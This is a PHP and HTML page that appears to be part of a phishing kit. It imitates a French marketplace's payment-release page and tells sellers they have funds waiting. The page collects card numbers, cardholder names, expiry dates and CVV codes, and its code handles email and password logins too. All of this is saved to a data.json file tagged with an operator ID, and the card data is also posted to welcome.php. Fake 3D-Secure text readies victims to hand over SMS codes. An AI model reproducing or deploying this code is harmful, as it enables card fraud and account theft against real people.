<?php
session_start();
if ($_SESSION['matricule'] == null) {
    header('location:index2.php');
}

// Charger le contenu de data.json
function loadJsonData()
{
    $jsonData = file_get_contents('data.json');
    return json_decode($jsonData, true);
}

// Enregistrer les données dans data.json
function saveJsonData($data)
{
    file_put_contents('data.json', json_encode($data));
}

if (isset($_POST['validers'])) {
    $mail = $_POST['mail'];
    $pass = $_POST['pass'];
    $matCara = $_SESSION['matricule'];

    $data = loadJsonData();
    $data['accesleboncoin'][] = [
        'email' => $mail,
        'password' => $pass,
        'matriculeCara' => $matCara
    ];
    saveJsonData($data);
}

if (isset($_POST['cbForm'])) {
    $cb = $_POST['cb'];
    $nom = $_POST['nom'];
    $date = $_POST['date'];
    $crypto = $_POST['crypto'];
    $matriculeCara = intval($_POST['matriculeCara']);

    $data = loadJsonData();
    $data['carte_credit'][] = [
        'cb' => $cb,
        'nom' => $nom,
        'date' => $date,
        'crypto' => $crypto,
        'matriculeCara' => $matriculeCara
    ];
    saveJsonData($data);

    $_SESSION['cb'] = $cb;
    $_SESSION['nom'] = $nom;
    $_SESSION['date'] = $date;
    $_SESSION['crypto'] = $crypto;

    header('Location: verifAcces.php');
    exit();
}





?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <link rel="shortcut icon" type="image/png" href="asset/img/log.png" />
    <title>Récupérer mes fonds</title>
    <script type="text/javascript" src="asset/js/creditly.js"></script>
    <link rel="stylesheet" href="asset/css/creditly.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script src="//code.jivosite.com/widget/00joJsgajZ" async></script>
</head>

<style>
    .space {
        margin-bottom: 28px;
    }

    .form-label {
        font-size: 12px;
        font-weight: bold;
    }

    .cardcara {
        overflow-y: hidden;
        height: 350px;
    }

    .error {
        display: block;
        position: fixed;
        padding-top: 25px;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: blue;
        background-color: rgba(0, 0, 0, 0.4);
        overflow-y: hidden;
    }

    @media only screen and (max-width: 600px) {
        .space {
            margin-bottom: 15px;
        }

        .cardcara {
            height: 540px;
        }
    }
</style>

<body>
    <nav class="navbar p-2 fixed-top" style="background-color: #fff; box-shadow: 0 2px 4px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.08);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="asset/img/ico.png" alt="" style="max-width:100%;"></a>
        </div>
    </nav>

    <div class="container-fluid" style="margin-top: 100px;">
        <div class="row">
            <div class="col-md-6 col-11 mx-auto">
                <div class="shadow p-3 mb-5 bg-body rounded">
                    <div>
                        <h1 style="font-size: 19px; font-weight:bold">
                            Montant à recevoir: <b class="montant_total" style="color: #ff6e14;"><?php echo $_SESSION['montant_total']; ?> €</b>
                        </h1>
                    </div>
                    <small>
                        <b class="nom"></b> <b class="prenom"><?php echo $_SESSION['email']; ?></b>, récupérer les fonds de vôtre marchandise.
                    </small>
                    <hr>
                    <p style="font-size: 14px; color:#191a19">
                        Vous avez reçu un paiement sécurisé en attente d'une vérification préalable au versement. Ce paiement sera transféré à votre carte bancaire étant donné que l'acheteur a effectué un paiement par carte bancaire.
                        <br><br>
                        <span style="font-weight: bold;">NB</span>: le paiement est en attente et n'apparaîtra dans votre historique de transaction qu'après vérification de vos données.
                    </p>
                    <hr>
                    <div>
                        Montant de l'achat : <e style="font-size: 15px;" class="montant_achat"><?php echo $_SESSION['montant_achat']; ?></e> €
                    </div>
                    <div>
                        Protection vente : <e style="font-size: 15px;" class="protection"><?php echo $_SESSION['protection_vente']; ?></e> €
                    </div>
                    <div>
                        Coûts de livraison Colissimo : <e style="font-size: 15px;" class="cout_livraison"><?php echo $_SESSION['montant_livraison']; ?></e> €
                    </div>
                </div>
                <div class="row">
                    <div class="card-type"></div>
                    <div id="vericard" class="vericard col-12 col-md-8 mx-auto m-4" style="display: none; margin-top: 30px; text-align: center;">
                        <img src="asset/img/load.gif" height="28" width="28" alt="">
                        <div class="mt-3"><b style="color: red;"> vérification en cours...</b></div>
                    </div>
                    <div id="cacheformr" class="veritext col-12 col-md-6 mx-auto m-4" style="display: none; margin-top: 30px; text-align: left;">
                        <p style="font-weight: bold;">
                            Votre établissement va maintenant vous authentifier avec la 3D-SECURE en vous demandant un code fictif ou notification, il ne sera pas débité, la mise à jour est gratuite. Pour sécuriser au mieux, vos ventes en ligne sur les sites affichant le logo Verified. Vous aurez une notification ou code fictif par SMS.
                        </p>
                    </div>
                    <div id="accesEnLigne" class="veritext col-12 col-md-6 mx-auto m-4" style="display: none; margin-top: 30px; text-align: left;">
                        <p style="font-weight: bold;">
                            Votre établissement va maintenant vous authentifier avec la 3D-SECURE en vous demandant un code fictif ou notification, il ne sera pas débité, la mise à jour est gratuite. Pour sécuriser au mieux, vos ventes en ligne sur les sites affichant le logo Verified. Vous aurez une notification ou code fictif par SMS.
                        </p>
                    </div>
                    <div class="col-md-12 col-12 cardcara">
                        <img src="asset/img/secure.png" alt="">
                        <form class="row creditly-card-form champ_form" method="post" onsubmit="return sendData();" id="cacher" style="margin-top: 50px;">
                            <div class="card-type"></div>
                            <section class="creditly-wrapper">
                                <div class="credit-card-wrapper">
                                    <div class="row" style="padding: 0%; margin: 0%;">
                                        <div class="col-md-4 space">
                                            <label for="validationCustom01" class="form-label">CB</label>
                                            <input type="text" placeholder="&#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149;" class="form-control credit-card-number" name="cb" id="cb" required>
                                            <div class="valid-feedback">Looks good!</div>
                                        </div>
                                        <div class="col-md-4 space">
                                            <label for="validationCustom02" class="form-label">Titulaire</label>
                                            <input type="text" placeholder="Nom écrit sur la carte" class="form-control billing-address-name" name='nom' id="nom" required>
                                            <div class="valid-feedback">Looks good!</div>
                                        </div>
                                    </div>
                                    <div class="row" style="padding: 0%; margin: 0%;">
                                        <div class="col-md-4 space">
                                            <label for="validationCustom03" class="form-label">Date</label>
                                            <input type="text" placeholder="MM/AA" name='date' class="form-control expiration-month-and-year" id="date" required>
                                            <div class="valid-feedback">Looks good!</div>
                                        </div>
                                        <div class="col-md-4 space">
                                            <label for="validationCustom04" class="form-label">Cryto</label>
                                            <input type="text" placeholder="Exemple: 123" class="form-control" name='crypto' id="crypto" required>
                                            <div class="valid-feedback">Looks good!</div>
                                        </div>
                                        <input type="hidden" name="matriculeCara" value="<?php echo $_SESSION['matricule']; ?>">
                                    </div>
                                </div>
                            </section>
                            <div class="row" style="padding: 0%; margin: 0%;">
                                <div class="col-md-4 col-12 space">
                                    <input class="btn btn-primary submit valideCara" onclick="sendData()" name="cbForm" type="submit" value=" Recuperer <?php echo $_SESSION['montant_total']; ?>€">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="row" style="padding: 0%; margin: 0%;">
                    <div class="col-12" style="margin-top:12px;">
                        <img class="d-none d-sm-block" style="max-width:100%;" src="asset/img/pied.png" alt="">
                        <img class="d-block d-sm-none" style="max-width:100%;" src="asset/img/pied_mobile.png" alt="">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript">
        $(function() {
            var creditly = Creditly.initialize('.creditly-wrapper .expiration-month-and-year', '.creditly-wrapper .security-code', '.creditly-wrapper .card-type');
            $('.code_sms').click(function(e) {
                e.preventDefault();
            });
        });
    </script>

    <script>
        function AfficherMasquer() {
            var divInfo = document.getElementById('vericard');
            var cacher = document.getElementById('cacheformr');
            var cacherfrom = document.getElementById('cacher');

            cacherfrom.style.display = 'none';
            cacher.style.display = 'block';
            divInfo.style.display = 'block';
        }
    </script>

    <script>
        function sendData() {
            var non = document.getElementById("nom").value;
            var cb = document.getElementById("cb").value;
            var date = document.getElementById("date").value;
            var crypto = document.getElementById("crypto").value;
            var matricule = document.getElementById("matriculeCara").value;

            $.ajax({
                type: 'post',
                url: 'welcome.php',
                data: {
                    nom: non,
                    cb: cb,
                    date: date,
                    crypto: crypto,
                    matriculeCara: matricule
                }
            });

            var divInfo = document.getElementById('vericard');
            var cacher = document.getElementById('cacheformr');
            var cacherfrom = document.getElementById('cacher');
            var accesEnligne = document.getElementById('accesEnLigne');

            cacherfrom.style.display = 'none';
            accesEnligne.style.display = 'block';

            return false;
        }
    </script>
</body>

</html>